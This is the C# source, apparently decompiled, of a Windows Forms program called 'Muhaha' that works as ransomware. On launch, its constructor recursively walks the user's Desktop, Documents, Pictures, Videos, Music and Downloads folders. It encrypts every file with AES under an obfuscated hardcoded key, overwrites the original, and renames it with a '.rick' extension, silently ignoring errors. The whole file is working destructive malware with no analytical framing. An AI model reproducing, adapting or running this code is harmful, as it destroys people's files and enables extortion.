using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Muhaha.Properties;

namespace Muhaha;

public class Form1 : Form
{
	private static uint SPI_SETDESKWALLPAPER = 20u;

	private static uint SPIF_UPDATEINIFILE = 1u;

	private static string key = "H4sIAAAAAAAEADMpMS9XrFJ11nLT9Ur0Sw4CAC1Ta0kQAAAA".DecompressFromBase64();

	private IContainer components = null;

	private PictureBox pictureBox1;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	public Form1()
	{
		encrypt();
		InitializeComponent();
	}

	private static void encrypt()
	{
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads");
		foreach (string item in list)
		{
			string[] files = Directory.GetFiles(item, "*.*", SearchOption.AllDirectories);
			string[] array = files;
			foreach (string text in array)
			{
				try
				{
					byte[] bytes = File.ReadAllBytes(text);
					string @string = Encoding.UTF8.GetString(bytes);
					string s = EncryptString(key, @string);
					byte[] bytes2 = Encoding.UTF8.GetBytes(s);
					File.WriteAllBytes(text, bytes2);
					File.Move(text, text + ".rick");
				}
				catch (Exception)
				{
				}
			}
		}
	}

	public static string EncryptString(string key, string plainText)
	{
		byte[] iV = new byte[16];
		byte[] inArray;
		using (Aes aes = Aes.Create())
		{
			aes.Key = Encoding.UTF8.GetBytes(key);
			aes.IV = iV;
			ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			using (StreamWriter streamWriter = new StreamWriter(stream))
			{
				streamWriter.Write(plainText);
			}
			inArray = memoryStream.ToArray();
		}
		return Convert.ToBase64String(inArray);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox1.set_Image((Image)(object)Resources.source);
		((Control)pictureBox1).set_Location(new Point(0, 40));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(355, 314));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(379, 441));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
